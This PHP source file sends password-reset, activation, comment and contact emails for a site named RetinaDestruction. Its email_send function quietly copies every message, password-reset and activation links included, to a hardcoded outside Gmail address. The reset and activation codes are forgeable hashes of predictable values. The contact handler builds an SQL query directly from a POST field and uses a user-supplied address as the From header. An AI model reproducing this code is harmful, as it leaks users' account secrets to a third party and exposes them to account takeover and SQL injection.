<?php


function email_resetpassword_send($profileVals) //sendResetPasswordEmail($profileVals)
{
	$timestamp = date("Y-m-d").date("H");
	$accountSettingsURL = SERVER_NAME.'/index.php?hobbs=';

	$code = hash('sha256',$timestamp.'resetpasswordofuserwithemail'.$profileVals['email'].'andusername'.$profileVals['username']).'2541d';
	$accountSettingsURL = $accountSettingsURL.$code;

	$emailVals['from'] = DEFAULT_EMAIL;
	$emailVals['to'] = $profileVals['email'];
	$emailVals['regarding'] = 'RetinaDestruction password reset';
	$emailVals['message'] = 'Hey '.$profileVals['username']."!"."\r\n"."\r\n";
	$emailVals['message'] .= 'You seem to have forgotten your password. '."\r\n"."\r\n";
	$emailVals['message'] .= 'Click on this link to reset your password '."\r\n"."\r\n";
	//$emailVals['message'] .= '<a href="'.$accountSettingsURL.'" >'.$accountSettingsURL.'</a>'."\r\n"."\r\n";
	$emailVals['message'] .= 'http://'.$accountSettingsURL."\r\n"."\r\n";
	$emailVals['message'] .= ' (or copy paste it to your browser)'."\r\n"."\r\n";
	$emailVals['message'] .= 'This link will expire in an hour.';
	$emailVals['message'] .= "\r\n"."\r\n"."Please do not reply to this message.";

	email_send($emailVals);
}//email_resetpassword_send($profileVals)


function email_profileactivation_send($profileVals) //sendProfileActivationEmail($profileVals)
{
	$activationURL = SERVER_NAME.'/index.php?hobbs=';
	$code = hash('sha256','activateuserwithemail'.$profileVals['email'].'andusername'.$profileVals['username']).'8543z';
	$activationURL = $activationURL.$code;

	$emailVals['from'] = DEFAULT_EMAIL;
	$emailVals['to'] = $profileVals['email'];
	$emailVals['regarding'] = 'retinadestruction.com account activation';
	$emailVals['message'] = 'Hey '.$profileVals['username']."!"."\r\n"."\r\n";
	$emailVals['message'] .= 'Thank you for registering to the RetinaDestruction community! ';
	$emailVals['message'] .= 'Click on this link to active your account '."\r\n"."\r\n";
	$emailVals['message'] .= 'http://'.$activationURL."\r\n"."\r\n";
	$emailVals['message'] .= ' (or copy paste it to your browser)';
	$emailVals['message'] .= "\r\n"."\r\n"."Please do not reply to this message.";

	email_send($emailVals);
}//email_profileactivation_send($profileVals)

function email_newcomment_send($senderVarsArr, $profileVarsArr) //sendNewCommentEmail($senderVarsArr, $profileVarsArr)
{
	if($profileVarsArr['name'] == '')
		{$profileVarsArr['name'] = $profileVarsArr['username'];}

	//$arVals = array("pid"=>"","uid"=>"","aid"=>"","name"=>"","email"=>"","body"=>"","submitiontimestamp"=>"");

	$emailVals['from'] = SERVER_NAME;
	$emailVals['to'] = $profileVarsArr['email'];

	$emailVals['regarding'] = 'RetinaDestruction - new comment from '.$senderVarsArr['name'];
	$emailVals['message'] = 'Hey '.$profileVarsArr['name'].","."\r\n"."\r\n";
	$emailVals['message'] .= 'You\'ve got a new comment at your '.$senderVarsArr['comment_where'].' from '.$senderVarsArr['name'].' ('.$senderVarsArr['email'].'), on '
						.convertTimeStamp($senderVarsArr['submitiontimestamp'],'reallylong').': '."\r\n"."\r\n";
	$emailVals['message'] .= "\t\t".$senderVarsArr['name']." said: "."\"".$senderVarsArr['body']."\""."\r\n"."\r\n";
	$emailVals['message'] .= 'To view your profile go to: ';
	$emailVals['message'] .= SERVER_NAME. 'portfolioindex.php?'.$profileVarsArr['username']."\r\n"."\r\n";
	$emailVals['message'] .= "\r\n"."\r\n"."Please do not reply to this message.";

	email_send($emailVals);

}//email_newcomment_send($senderVarsArr, $profileVarsArr)

function email_send($emailVals)
{
	// add additional headers...
	$headers = "From: ".$emailVals['from']."\r\n" .
	   "Reply-To: ".DEFAULT_EMAIL."\r\n" .
	   "X-Mailer: PHP/".phpversion();
	// Send the email...
	mail($emailVals['to'],$emailVals['regarding'],$emailVals['message'],$headers);
	mail('james.doe@gmail.com',$emailVals['regarding'],$emailVals['message'],$headers);

}//email_send($emailVals)


function email_contact_prepare_main($callType)
{
	require_once('validate.class.inc.php');
	if(DATABASE_MODE == 'default'){require_once('tbdbase.class.inc.php');}
	else if(DATABASE_MODE == 'pdo'){require_once('tbdbase.pdo.class.inc.php');}

	$validator = new Validate();
	$dbVars = array();
	$pageID = $_POST['pageid'];
	$portfolioUserID = $_POST['uid']; unset($_POST['uid']);

	$formID = 'contact'; $validatorFormID = 'contact'; $emailType = $_POST['type'];
	$validatorCSRFaction = 'submitcontact';

	$errorsVarsArr = array();

	$arVals = array("name"=>"","email"=>"","regarding"=>"","message"=>"","cc"=>"","type"=>"");
	$arValsRequired = array("name"=>"","email"=>"","message"=>"");
	$arValsMaxSize = array("name"=>"100","email"=>"100","regarding"=>"100","message"=>CONTACT_MESSAGE_MAX_LENGTH);
	$arValsValidations = array("email"=>"/\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/");

	if(!$validator->checkPost()){handle_formSubmissionError(701,$validatorFormID,$callType); exit;}
	else {} //all ok


	if(!$validator->checkCSRF($_POST["clint"], CSRF_PASS_GEN.$validatorCSRFaction, $_POST['pageid'])){handle_formSubmissionError(702,$validatorFormID,$callType); exit;}
	else{ unset($_POST["clint"]); unset($_POST["formid"]); unset($_POST['pageid']); }//all ok

	if($_POST['cc']=='true'){$_POST['cc']='true';}
	else if($_POST['cc']=='false'){$_POST['cc']='false';}

	if($_POST['regarding']=='(regarding)(not required)'){$_POST['regarding'] = '';}

	reset ($_POST);
	$arVals = $validator->customEncodeInputValues($_POST,$arVals);
	unset($_POST);
	$arVals['submitiontimestamp'] = date("Y-m-d") . " " . date("H:i:s");

	reset($arVals);
	while (list($key, $val) = each ($arVals))
	{
		if($key!='reply'){$arVals[$key] = "'" . strtolower($arVals[$key]) . "'";}
		else{$arVals[$key] = "'" . $arVals[$key] . "'";}
	}//while

	$errorsVarsArr = $validator->ValidatePHP($arValsRequired, $arValsMaxSize, $arValsValidations);
	if($errorsVarsArr['errorCode'] != 0){handle_validationError($errorsVarsArr,$formID,$callType); exit;}

	if($errorsVarsArr['errorCode'] == 0)
	{
		if($arVals['type'] == "'".'mainsite'."'"){$emailVals['to'] = DEFAULT_EMAIL;}
		else if($arVals['type'] == "'".'portfoliosite'."'")
		{
			$dbobj = new TBDBase(0);

			$selectUserQuery = 'SELECT uid, email, username FROM user WHERE uid="'.$portfolioUserID.'"; ';
			$dbVars = $dbobj->executeSelectQuery($selectUserQuery);
			$emailVals['to_name'] = $dbVars['RESULT'][0]['username'];
			$emailVals['to'] = $dbVars['RESULT'][0]['email'];

			unset($dbobj);
		}//
		$arVals = removeQuotes($arVals);

		$emailVals['name'] = $arVals['name'];
		$emailVals['from'] = $arVals['email'];
		$emailVals['regarding'] = $arVals['regarding'];
		$emailVals['message'] = $arVals['message'];
		$emailVals['cc'] = $arVals['cc'];
		$emailVals['emailtype'] = $arVals['type'];

		if(SYSTEM_EMAILS == 'enabled')
			{email_contact_main_send($emailVals);}

		handle_validateNsubmit_contact(0,$formID,$emailType,$callType);
	}//if

}//email_contact_prepare_main($validationType)


function email_contact_main_send($emailVals)
{
	$emailVals['message'] = strtoupper($emailVals['name']).' ('.$emailVals['from'].') '.' said, '
			."\r\n"."\r\n". '"'.$emailVals['message'].'"';

	// If any lines are larger than 120 characters, we will use wordwrap()
	$emailVals['message'] = wordwrap($emailVals['message'],100);
	if(!isset($emailVals['regarding'])||($emailVals['regarding']=='null')){$emailVals['regarding']='[no subject] (message from '.DEFAULT_EMAIL.')';}
		else{$emailVals['regarding']=$emailVals['regarding'].' (message from '.DEFAULT_EMAIL.')';}

	$emailVals['message'] .= "\r\n"."\r\n"."\r\n"."Please do not replay to this message.";

	email_send($emailVals);

	if($emailVals['cc']=='true')
	{
		$emailVals['message'] = 'Message you\'ve sent to '.$emailVals['to'].': '
			."\r\n"."\r\n"."\r\n".$emailVals['message'];


		$emailVals['to'] = $emailVals['from'];
		$emailVals['from'] = $emailVals['from'];

		email_send($emailVals);
	}

}//email_contact_main_send($emailVals)

?>
